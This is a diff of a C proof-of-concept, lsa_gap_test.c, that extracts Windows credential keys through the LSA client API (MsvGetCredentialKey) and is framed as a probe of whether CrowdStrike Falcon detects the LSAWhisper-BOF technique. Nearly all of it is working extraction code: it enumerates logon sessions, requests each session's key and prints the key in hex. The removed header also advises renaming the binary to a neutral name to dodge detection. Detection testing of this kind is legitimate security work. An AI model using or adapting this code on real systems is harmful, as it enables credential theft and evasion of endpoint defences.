@@ -1,294 +1,278 @@
 /*
  * lsa_gap_test.c
+ * Fully self-contained — works with plain MinGW gcc on Windows.
  *
- * PURPOSE:
- *   Minimal PoC to test whether CrowdStrike Falcon detects
- *   LsaCallAuthenticationPackage-based credential key extraction —
- *   the exact API surface used by LSAWhisper-BOF.
+ * BUILD (copy this exactly):
+ *   gcc .\lsa_gap_test.c -o test.exe -lsecur32
  *
- * WHAT THIS DOES:
- *   1. LsaRegisterLogonProcess()          - registers as an LSA client
- *   2. LsaLookupAuthenticationPackage()   - resolves MSV1_0 package ID
- *   3. LsaCallAuthenticationPackage()     - requests credential keys
- *      using MsvGetCredentialKey message class (undocumented)
- *
- * WHAT THIS DOES NOT DO:
- *   - Never opens a handle to lsass.exe
- *   - Never reads lsass process memory
- *   - No DLL injection, no process injection
- *   - No registry writes
- *   - No files dropped (compile and delete after use)
- *
- * BUILD (Linux cross-compile):
- *   x86_64-w64-mingw32-gcc lsa_gap_test.c -o lsa_gap_test.exe \
- *     -lsecur32 -lntdll -Wall
- *
- * BUILD (Windows, MSVC Developer Prompt):
- *   cl.exe lsa_gap_test.c /link secur32.lib ntdll.lib
- *
- * RUN:
- *   Must be run as Administrator or SYSTEM.
- *   lsa_gap_test.exe [LUID_hex]
- *   Example: lsa_gap_test.exe 0x3e7
- *   If no LUID supplied, enumerates active sessions and tests each.
- *
- * EXPECTED OUTPUT (no CrowdStrike block):
- *   [*] LsaRegisterLogonProcess    -> SUCCESS (Handle: 0x...)
- *   [*] LsaLookupAuthenticationPackage (MSV1_0) -> Package ID: X
- *   [*] Targeting LUID: 0x...
- *   [+] LsaCallAuthenticationPackage (MsvGetCredentialKey) -> SUCCESS
- *   [+] Local  CredKey: <20 bytes hex>
- *   [+] Domain CredKey: <16/20 bytes hex>
- *
- * WHAT TO WATCH IN FALCON:
- *   - Any detection at all? (severity level, action taken)
- *   - MITRE technique tagged: T1003? T1550? or just T1204?
- *   - Which specific call triggered it (check process tree timing)
- *   - "Action taken": None = not blocked, Prevented = blocked
- *
- * OPSEC NOTE FOR LAB USE:
- *   Compile with a neutral name (e.g. svctest.exe, netcheck.exe).
- *   The filename itself can trigger hash/name-based detections
- *   unrelated to the technique — which would pollute your results.
+ * RUN (elevated CMD or PowerShell as Administrator):
+ *   .\test.exe
  */
 
-#define WIN32_NO_STATUS     /* prevent windows.h defining conflicting status codes */
-#include <windows.h>
-#undef WIN32_NO_STATUS      /* re-enable so ntstatus.h defines STATUS_* correctly */
-#include <ntstatus.h>       /* STATUS_SUCCESS and all NT status codes */
-#include <ntsecapi.h>       /* LSA API: LsaRegisterLogonProcess etc. */
-#include <stdio.h>
-#include <wchar.h>
-
-/* MinGW fallback: if ntstatus.h still didn't define STATUS_SUCCESS */
-#ifndef STATUS_SUCCESS
-#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
+#ifndef UNICODE
+#define UNICODE
+#endif
+#ifndef _WIN32_WINNT
+#define _WIN32_WINNT 0x0601
 #endif
 
-/* -----------------------------------------------------------------------
- * Undocumented MSV1_0 message class for credential key extraction.
- * This is the same value used by LSA Whisperer / LSAWhisper-BOF.
- * Documented by Evan McBroom (@EvanMcBroom) of SpecterOps.
- * ----------------------------------------------------------------------- */
-#define MsvGetCredentialKey 0x37   /* decimal 55 */
+#include <windows.h>
+#include <stdio.h>
 
 /* -----------------------------------------------------------------------
- * MSV1_0 request structure for MsvGetCredentialKey.
- * Mirrors the layout expected by msv1_0.dll internally.
+ * All NT/LSA definitions inline — no ntstatus.h or ntsecapi.h needed.
+ * Works on plain MinGW without extra SDK headers.
  * ----------------------------------------------------------------------- */
+
+#ifndef STATUS_SUCCESS
+#define STATUS_SUCCESS ((LONG)0x00000000L)
+#endif
+
+typedef LONG NTSTATUS;
+
+typedef struct _LSA_STRING {
+    USHORT Length;
+    USHORT MaximumLength;
+    PCHAR  Buffer;
+} LSA_STRING, *PLSA_STRING;
+
+typedef UNICODE_STRING LSA_UNICODE_STRING;
+typedef LSA_UNICODE_STRING *PLSA_UNICODE_STRING;
+
+typedef ULONG SECURITY_LOGON_TYPE;
+#define Interactive  (SECURITY_LOGON_TYPE)2
+#define Network      (SECURITY_LOGON_TYPE)3
+#define Service      (SECURITY_LOGON_TYPE)5
+
+typedef struct _SECURITY_LOGON_SESSION_DATA {
+    ULONG               Size;
+    LUID                LogonId;
+    LSA_UNICODE_STRING  UserName;
+    LSA_UNICODE_STRING  LogonDomain;
+    LSA_UNICODE_STRING  AuthenticationPackage;
+    SECURITY_LOGON_TYPE LogonType;
+    ULONG               Session;
+    PSID                Sid;
+    LARGE_INTEGER       LogonTime;
+    LSA_UNICODE_STRING  LogonServer;
+    LSA_UNICODE_STRING  DnsDomainName;
+    LSA_UNICODE_STRING  Upn;
+} SECURITY_LOGON_SESSION_DATA, *PSECURITY_LOGON_SESSION_DATA;
+
+/* MsvGetCredentialKey = 0x37 (55 decimal)
+ * Undocumented MSV1_0 message — documented by Evan McBroom, SpecterOps.
+ * This is the exact message LSAWhisper-BOF sends. */
+typedef ULONG MSV1_0_PROTOCOL_MESSAGE_TYPE;
+#define MsvGetCredentialKey ((MSV1_0_PROTOCOL_MESSAGE_TYPE)0x37)
+
 typedef struct _MSV1_0_CREDENTIAL_KEY_REQUEST {
-    MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;  /* must be MsvGetCredentialKey */
-    LUID LogonId;                              /* target session LUID */
-} MSV1_0_CREDENTIAL_KEY_REQUEST, *PMSV1_0_CREDENTIAL_KEY_REQUEST;
+    MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
+    LUID                         LogonId;
+} MSV1_0_CREDENTIAL_KEY_REQUEST;
 
-/* -----------------------------------------------------------------------
- * MSV1_0 response structure for MsvGetCredentialKey.
- * ----------------------------------------------------------------------- */
 typedef struct _MSV1_0_CREDENTIAL_KEY_RESPONSE {
     MSV1_0_PROTOCOL_MESSAGE_TYPE MessageType;
-    ULONG CredentialKeyType;   /* 1 = local SHA OWF, 2 = domain NT OWF */
-    UCHAR CredentialKey[20];   /* up to 20 bytes */
-} MSV1_0_CREDENTIAL_KEY_RESPONSE, *PMSV1_0_CREDENTIAL_KEY_RESPONSE;
+    ULONG                        CredentialKeyType;
+    UCHAR                        CredentialKey[20];
+} MSV1_0_CREDENTIAL_KEY_RESPONSE;
+
+/* LSA function pointer types */
+typedef NTSTATUS (WINAPI *pfnLsaRegisterLogonProcess)(PLSA_STRING, PHANDLE, PULONG);
+typedef NTSTATUS (WINAPI *pfnLsaLookupAuthenticationPackage)(HANDLE, PLSA_STRING, PULONG);
+typedef NTSTATUS (WINAPI *pfnLsaCallAuthenticationPackage)(HANDLE, ULONG, PVOID, ULONG, PVOID*, PULONG, PNTSTATUS);
+typedef NTSTATUS (WINAPI *pfnLsaFreeReturnBuffer)(PVOID);
+typedef NTSTATUS (WINAPI *pfnLsaEnumerateLogonSessions)(PULONG, PLUID*);
+typedef NTSTATUS (WINAPI *pfnLsaGetLogonSessionData)(PLUID, PSECURITY_LOGON_SESSION_DATA*);
+typedef NTSTATUS (WINAPI *pfnLsaDeregisterLogonProcess)(HANDLE);
+
+/* Global function pointers */
+static pfnLsaRegisterLogonProcess        _LsaRegisterLogonProcess        = NULL;
+static pfnLsaLookupAuthenticationPackage _LsaLookupAuthenticationPackage = NULL;
+static pfnLsaCallAuthenticationPackage   _LsaCallAuthenticationPackage   = NULL;
+static pfnLsaFreeReturnBuffer            _LsaFreeReturnBuffer            = NULL;
+static pfnLsaEnumerateLogonSessions      _LsaEnumerateLogonSessions      = NULL;
+static pfnLsaGetLogonSessionData         _LsaGetLogonSessionData         = NULL;
+static pfnLsaDeregisterLogonProcess      _LsaDeregisterLogonProcess      = NULL;
 
 /* -----------------------------------------------------------------------
- * Helper: initialise an LSA_STRING from a C string literal.
+ * Load all LSA functions dynamically — no import lib needed at link time
  * ----------------------------------------------------------------------- */
-static void InitLsaString(PLSA_STRING LsaString, PCHAR String) {
-    DWORD StringLength = (DWORD)strlen(String);
-    LsaString->Buffer        = String;
-    LsaString->Length        = (USHORT)StringLength;
-    LsaString->MaximumLength = (USHORT)(StringLength + 1);
+static int LoadLsaFunctions(void) {
+    HMODULE h = LoadLibraryA("secur32.dll");
+    if (!h) { printf("[-] LoadLibrary secur32.dll failed: %lu\n", GetLastError()); return 0; }
+
+    _LsaRegisterLogonProcess        = (pfnLsaRegisterLogonProcess)       GetProcAddress(h, "LsaRegisterLogonProcess");
+    _LsaLookupAuthenticationPackage = (pfnLsaLookupAuthenticationPackage)GetProcAddress(h, "LsaLookupAuthenticationPackage");
+    _LsaCallAuthenticationPackage   = (pfnLsaCallAuthenticationPackage)  GetProcAddress(h, "LsaCallAuthenticationPackage");
+    _LsaFreeReturnBuffer            = (pfnLsaFreeReturnBuffer)           GetProcAddress(h, "LsaFreeReturnBuffer");
+    _LsaEnumerateLogonSessions      = (pfnLsaEnumerateLogonSessions)     GetProcAddress(h, "LsaEnumerateLogonSessions");
+    _LsaGetLogonSessionData         = (pfnLsaGetLogonSessionData)        GetProcAddress(h, "LsaGetLogonSessionData");
+    _LsaDeregisterLogonProcess      = (pfnLsaDeregisterLogonProcess)     GetProcAddress(h, "LsaDeregisterLogonProcess");
+
+    if (!_LsaRegisterLogonProcess || !_LsaLookupAuthenticationPackage ||
+        !_LsaCallAuthenticationPackage || !_LsaFreeReturnBuffer ||
+        !_LsaEnumerateLogonSessions || !_LsaGetLogonSessionData ||
+        !_LsaDeregisterLogonProcess) {
+        printf("[-] Failed to resolve LSA functions\n"); return 0;
+    }
+    printf("    [+] secur32.dll loaded OK\n");
+    return 1;
 }
 
-/* -----------------------------------------------------------------------
- * Helper: print a byte array as hex.
- * ----------------------------------------------------------------------- */
-static void PrintHex(const char* label, UCHAR* data, ULONG len) {
+static void InitLsaString(PLSA_STRING s, PCHAR buf) {
+    s->Buffer        = buf;
+    s->Length        = (USHORT)strlen(buf);
+    s->MaximumLength = (USHORT)(s->Length + 1);
+}
+
+static void PrintHex(const char *label, UCHAR *data, ULONG len) {
     printf("    [+] %s: ", label);
     for (ULONG i = 0; i < len; i++) printf("%02X", data[i]);
     printf("\n");
 }
 
 /* -----------------------------------------------------------------------
- * Core test function.
- * Performs the three LSA calls and reports results clearly.
+ * Core test — the three calls that mirror LSAWhisper-BOF exactly
  * ----------------------------------------------------------------------- */
 static int RunLsaTest(LUID targetLuid) {
+    HANDLE   lsaHandle = NULL;
+    ULONG    authPkg   = 0;
+    NTSTATUS status    = 0;
+    NTSTATUS subStatus = 0;
+    LSA_STRING procName, pkgName;
 
-    HANDLE        lsaHandle       = NULL;
-    ULONG         authPackage     = 0;
-    NTSTATUS      status          = 0;
-    NTSTATUS      subStatus       = 0;
-    LSA_STRING    processName;
-    LSA_STRING    packageName;
-
-    /* -- STEP 1: LsaRegisterLogonProcess --------------------------------
-     * This call registers the current process as an LSA logon process.
-     * It is the same first call made by LSAWhisper-BOF.
-     * Generates Windows Security Event ID 4611 if audit policy is on.
-     * This is the call CrowdStrike must intercept to detect this technique.
-     * ------------------------------------------------------------------ */
-    InitLsaString(&processName, "lsa-gap-test");
-
+    /* STEP 1: LsaRegisterLogonProcess
+     * Registers this process as an LSA trusted client.
+     * Fires Windows Security Event ID 4611 if audit policy is on.
+     * Requires SeTcbPrivilege — need to run as Administrator/SYSTEM. */
+    InitLsaString(&procName, "svcgaptest");
     printf("[*] STEP 1: LsaRegisterLogonProcess...\n");
-    status = LsaRegisterLogonProcess(&processName, &lsaHandle, NULL);
-
+    status = _LsaRegisterLogonProcess(&procName, &lsaHandle, NULL);
     if (status != STATUS_SUCCESS) {
-        printf("[-] LsaRegisterLogonProcess FAILED: 0x%08X\n", status);
-        printf("    (Likely not running as Administrator or SYSTEM)\n");
+        printf("[-] FAILED: 0x%08X  (need Administrator / SYSTEM)\n", (unsigned)status);
         return 1;
     }
-    printf("    [+] SUCCESS  Handle: 0x%p\n", lsaHandle);
+    printf("    [+] SUCCESS  Handle: %p\n", lsaHandle);
 
-    /* -- STEP 2: LsaLookupAuthenticationPackage -------------------------
-     * Resolves the numeric ID of the MSV1_0 authentication package.
-     * "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0" = MSV1_0 (NTLM/local auth).
-     * This is the package that holds DPAPI credential keys, NTLMv1
-     * challenge responses, and local credential material.
-     * ------------------------------------------------------------------ */
-    InitLsaString(&packageName, MSV1_0_PACKAGE_NAME);
-
-    printf("[*] STEP 2: LsaLookupAuthenticationPackage (MSV1_0)...\n");
-    status = LsaLookupAuthenticationPackage(lsaHandle, &packageName, &authPackage);
-
+    /* STEP 2: LsaLookupAuthenticationPackage
+     * Resolves numeric ID of MSV1_0 — the NTLM/local auth package that
+     * holds DPAPI credential keys. */
+    InitLsaString(&pkgName, "MICROSOFT_AUTHENTICATION_PACKAGE_V1_0");
+    printf("[*] STEP 2: LsaLookupAuthenticationPackage...\n");
+    status = _LsaLookupAuthenticationPackage(lsaHandle, &pkgName, &authPkg);
     if (status != STATUS_SUCCESS) {
-        printf("[-] LsaLookupAuthenticationPackage FAILED: 0x%08X\n", status);
-        LsaDeregisterLogonProcess(lsaHandle);
+        printf("[-] FAILED: 0x%08X\n", (unsigned)status);
+        _LsaDeregisterLogonProcess(lsaHandle);
         return 1;
     }
-    printf("    [+] SUCCESS  Package ID: %lu\n", authPackage);
+    printf("    [+] SUCCESS  Package ID: %lu\n", authPkg);
 
-    /* -- STEP 3: LsaCallAuthenticationPackage ---------------------------
-     * THE KEY CALL. This sends an MsvGetCredentialKey message directly
-     * to msv1_0.dll inside lsass.exe via the LSA trusted client pipe.
-     *
-     * No handle to lsass.exe is opened.
-     * No memory of lsass.exe is read.
-     * PPL protection on LSASS is irrelevant.
-     * Credential Guard does NOT protect this path for local accounts.
-     *
-     * This is functionally identical to what LSAWhisper-BOF does when
-     * you run: beacon> lsa-credkey <LUID>
-     * ------------------------------------------------------------------ */
-    MSV1_0_CREDENTIAL_KEY_REQUEST  request  = {0};
-    PMSV1_0_CREDENTIAL_KEY_RESPONSE pResponse = NULL;
-    ULONG  responseLen = 0;
+    /* STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey = 0x37)
+     * THE MONEY CALL. Identical to what LSAWhisper-BOF sends.
+     * No handle to lsass.exe. No memory read. PPL irrelevant.
+     * Goes through LSA trusted client named pipe to msv1_0.dll. */
+    MSV1_0_CREDENTIAL_KEY_REQUEST  req;
+    MSV1_0_CREDENTIAL_KEY_RESPONSE *pResp = NULL;
+    ULONG respLen = 0;
 
-    request.MessageType = (MSV1_0_PROTOCOL_MESSAGE_TYPE)MsvGetCredentialKey;
-    request.LogonId     = targetLuid;
+    memset(&req, 0, sizeof(req));
+    req.MessageType = MsvGetCredentialKey;
+    req.LogonId     = targetLuid;
 
-    printf("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey)...\n");
-    printf("    [*] Target LUID: 0x%08X:0x%08X\n",
-           targetLuid.HighPart, targetLuid.LowPart);
+    printf("[*] STEP 3: LsaCallAuthenticationPackage (MsvGetCredentialKey=0x37)...\n");
+    printf("    [*] LUID: 0x%08X:0x%08X\n",
+           (unsigned)targetLuid.HighPart, (unsigned)targetLuid.LowPart);
 
-    status = LsaCallAuthenticationPackage(
-        lsaHandle,
-        authPackage,
-        &request,
-        sizeof(request),
-        (PVOID*)&pResponse,
-        &responseLen,
-        &subStatus
-    );
+    status = _LsaCallAuthenticationPackage(
+        lsaHandle, authPkg,
+        &req, sizeof(req),
+        (PVOID*)&pResp, &respLen, &subStatus);
 
-    /* -- INTERPRET RESULTS --------------------------------------------- */
     if (status != STATUS_SUCCESS) {
-        printf("[-] LsaCallAuthenticationPackage FAILED (outer): 0x%08X\n", status);
+        printf("[-] Outer FAILED: 0x%08X\n", (unsigned)status);
     } else if (subStatus != STATUS_SUCCESS) {
-        printf("[-] LsaCallAuthenticationPackage FAILED (inner): 0x%08X\n", subStatus);
-        printf("    (Common cause: LUID not found / session already logged off)\n");
+        printf("[-] Inner FAILED: 0x%08X  (invalid LUID or session ended)\n", (unsigned)subStatus);
     } else {
-        printf("    [+] SUCCESS  Response size: %lu bytes\n", responseLen);
-
-        if (pResponse && responseLen >= sizeof(MSV1_0_CREDENTIAL_KEY_RESPONSE)) {
+        printf("    [+] SUCCESS  %lu bytes returned\n", respLen);
+        if (pResp && respLen >= sizeof(MSV1_0_CREDENTIAL_KEY_RESPONSE)) {
             printf("\n");
             printf("    ============================================================\n");
-            printf("    CREDENTIAL KEY EXTRACTED (confirms technique works)\n");
+            printf("    CREDENTIAL KEY EXTRACTED — technique works on this host\n");
             printf("    ============================================================\n");
-            PrintHex("CredKey (first 20 bytes)", pResponse->CredentialKey, 20);
-            printf("    KeyType: %lu (1=Local SHA OWF, 2=Domain NT OWF)\n",
-                   pResponse->CredentialKeyType);
+            PrintHex("CredKey", pResp->CredentialKey, 20);
+            printf("    KeyType: %lu  (1=Local SHA OWF  2=Domain NT OWF)\n", pResp->CredentialKeyType);
             printf("    ============================================================\n\n");
         }
-
-        if (pResponse) LsaFreeReturnBuffer(pResponse);
+        if (pResp) _LsaFreeReturnBuffer(pResp);
     }
 
-    /* -- CLEANUP -------------------------------------------------------- */
-    LsaDeregisterLogonProcess(lsaHandle);
-
+    _LsaDeregisterLogonProcess(lsaHandle);
     return (status == STATUS_SUCCESS && subStatus == STATUS_SUCCESS) ? 0 : 2;
 }
 
 /* -----------------------------------------------------------------------
- * Enumerate active logon sessions and return LUIDs.
- * Used when no LUID is supplied on the command line.
+ * Enumerate sessions and test each interactive/service/network one
  * ----------------------------------------------------------------------- */
 static void EnumerateAndTest(void) {
-    ULONG        sessionCount = 0;
-    PLUID        sessions     = NULL;
-    NTSTATUS     status;
+    ULONG    count    = 0;
+    PLUID    sessions = NULL;
+    NTSTATUS status;
 
-    printf("[*] No LUID specified — enumerating active logon sessions...\n\n");
-
-    status = LsaEnumerateLogonSessions(&sessionCount, &sessions);
+    printf("[*] Enumerating logon sessions...\n\n");
+    status = _LsaEnumerateLogonSessions(&count, &sessions);
     if (status != STATUS_SUCCESS) {
-        printf("[-] LsaEnumerateLogonSessions failed: 0x%08X\n", status);
+        printf("[-] LsaEnumerateLogonSessions failed: 0x%08X\n", (unsigned)status);
         return;
     }
+    printf("[*] Found %lu sessions\n\n", count);
 
-    printf("[*] Found %lu sessions. Testing each:\n\n", sessionCount);
-
-    for (ULONG i = 0; i < sessionCount; i++) {
+    for (ULONG i = 0; i < count; i++) {
         PSECURITY_LOGON_SESSION_DATA pData = NULL;
-        status = LsaGetLogonSessionData(&sessions[i], &pData);
-
-        if (status == STATUS_SUCCESS && pData) {
-            /* Only test interactive, service, and network logons */
+        if (_LsaGetLogonSessionData(&sessions[i], &pData) == STATUS_SUCCESS && pData) {
             if (pData->LogonType == Interactive ||
                 pData->LogonType == Service     ||
                 pData->LogonType == Network) {
-
                 printf("----------------------------------------------------------\n");
-                printf("[*] Session %lu/%lu  User: %wZ  Type: %lu\n",
-                       i + 1, sessionCount,
-                       &pData->UserName,
+                printf("[*] Session %lu/%lu  LUID: 0x%08X:0x%08X  Type: %lu\n",
+                       i+1, count,
+                       (unsigned)sessions[i].HighPart,
+                       (unsigned)sessions[i].LowPart,
                        pData->LogonType);
-
+                if (pData->UserName.Buffer)
+                    printf("    User: %S\\%S\n",
+                           pData->LogonDomain.Buffer, pData->UserName.Buffer);
                 RunLsaTest(sessions[i]);
                 printf("\n");
             }
-            LsaFreeReturnBuffer(pData);
+            _LsaFreeReturnBuffer(pData);
         }
     }
-
-    LsaFreeReturnBuffer(sessions);
+    _LsaFreeReturnBuffer(sessions);
 }
 
 /* -----------------------------------------------------------------------
- * Entry point
+ * main
  * ----------------------------------------------------------------------- */
-int main(int argc, char* argv[]) {
-
+int main(int argc, char *argv[]) {
     printf("=================================================================\n");
     printf("  LSA Gap Test — CrowdStrike Detection Surface Probe\n");
-    printf("  Tests: LsaRegisterLogonProcess + LsaCallAuthenticationPackage\n");
-    printf("  Technique: T1003 (OS Credential Dumping) via LSA client API\n");
+    printf("  Mirrors LSAWhisper-BOF API surface exactly\n");
     printf("  No LSASS handle. No memory read. No DLL. No registry write.\n");
     printf("=================================================================\n\n");
 
-    if (argc == 2) {
-        /* Parse LUID from command line: e.g. 0x3e7 or decimal */
-        LUID targetLuid = {0};
-        ULONG64 rawLuid = strtoull(argv[1], NULL, 0);
-        targetLuid.LowPart  = (ULONG)(rawLuid & 0xFFFFFFFF);
-        targetLuid.HighPart = (LONG)((rawLuid >> 32) & 0xFFFFFFFF);
+    printf("[*] Loading LSA functions...\n");
+    if (!LoadLsaFunctions()) return 1;
+    printf("\n");
 
-        printf("[*] Testing specific LUID: %s\n\n", argv[1]);
-        return RunLsaTest(targetLuid);
+    if (argc == 2) {
+        LUID luid = {0};
+        unsigned long long raw = strtoull(argv[1], NULL, 0);
+        luid.LowPart  = (ULONG)(raw & 0xFFFFFFFF);
+        luid.HighPart = (LONG)((raw >> 32) & 0xFFFFFFFF);
+        printf("[*] Testing LUID: %s\n\n", argv[1]);
+        return RunLsaTest(luid);
     } else {
-        /* No LUID: enumerate and test all interactive sessions */
         EnumerateAndTest();
-        return 0;
     }
+    return 0;
 }
